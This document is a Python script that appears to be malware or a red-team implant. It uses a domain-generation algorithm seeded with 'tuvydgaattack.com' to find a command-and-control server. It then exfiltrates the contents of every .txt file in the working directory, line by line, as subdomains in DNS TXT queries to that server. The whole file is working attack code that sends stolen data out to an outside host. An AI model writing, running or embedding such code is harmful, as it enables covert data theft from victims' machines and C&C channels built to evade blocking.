import socket
import requests
import subprocess
import time
import re
import dns.resolver
import os


seed = 'tuvydgaattack.com'
numberDomains = 500
victimID = None
proxy_port = 80

# --- DGA Functions ---
def map_to_lowercase_letter(s):
    return ord('a') + ((s - ord('a')) % 26)

def next_domain(domain):
    dl = [ord(x) for x in list(domain)]
    dl[0] = map_to_lowercase_letter(dl[0] + dl[3])
    dl[1] = map_to_lowercase_letter(dl[0] + 2*dl[1])
    dl[2] = map_to_lowercase_letter(dl[0] + dl[2] - 1)
    dl[3] = map_to_lowercase_letter(dl[1] + dl[2] + dl[3])
    return ''.join([chr(x) for x in dl])

def generateDGADomains():
    currentDomain = seed
    generated_domains = []
    # Generate domains, starting from the next one after the seed
    for i in range(numberDomains):
        currentDomain = next_domain(currentDomain)
        generated_domains.append(currentDomain)
    return generated_domains

# --- C&C Communication Functions ---

def resolve_domain(domain): 
    """
    Resolves a single domain to an IP address.
    """
    try:
        print(f"[*] Resolving {domain}...")
        result = socket.gethostbyname(domain)
        print(f"[+] Found: {domain} {result}")
        return result
    except Exception as e:
        print(f"[-] Failed to resolve {domain}: {e}")
    return None


def main():
    
    domains = generateDGADomains()
    target_domain = None
    cnc_ip = None
    # Iterate through generated domains to find the C&C server
    for domain in domains:
        ip = resolve_domain(domain)
        if ip:
            print(f"[+] Resolved {domain} to {ip}")
            cnc_ip = ip
            target_domain = domain
            break # Found C&C, stop resolving
    
    if not cnc_ip:
        print("[!] No C&C server found. Exiting.")
        return

    
    try:
        # Set the resolver to use the attacker's nameserver
        resolver = dns.resolver.Resolver()
        
        # Iterate over all .txt files in the current directory
        for filename in os.listdir('.'):
            if filename.endswith('.txt'):
                print(f"\nProcessing file: {filename}\n")
                with open(filename, 'r') as file:
                    for line in file:
                        # Clean up the line (remove whitespace and newline characters)
                        subdomain_prefix = line.strip()
                        if subdomain_prefix:
                            # Replace spaces with underscores
                            subdomain_prefix = subdomain_prefix.replace(' ', '_')
                            full_query = f"{subdomain_prefix}.{target_domain}"
                            try:
                                # Perform the DNS query for an A record
                                answers = resolver.resolve(full_query, 'TXT')
                                # Print the resolved IP address(es)
                                for rdata in answers:
                                    print(f"Query for {full_query}: {rdata.to_text()}")
                            except dns.resolver.NoAnswer:
                                print(f"No TXT record found for {full_query}")
                            except dns.resolver.NXDOMAIN:
                                print(f"Domain does not exist: {full_query}")
                            except Exception as e:
                                print(f"An error occurred while querying {full_query}: {e}")
    except Exception as e:
        print(f"An unexpected error occurred: {e}")

if __name__ == "__main__":
    main()
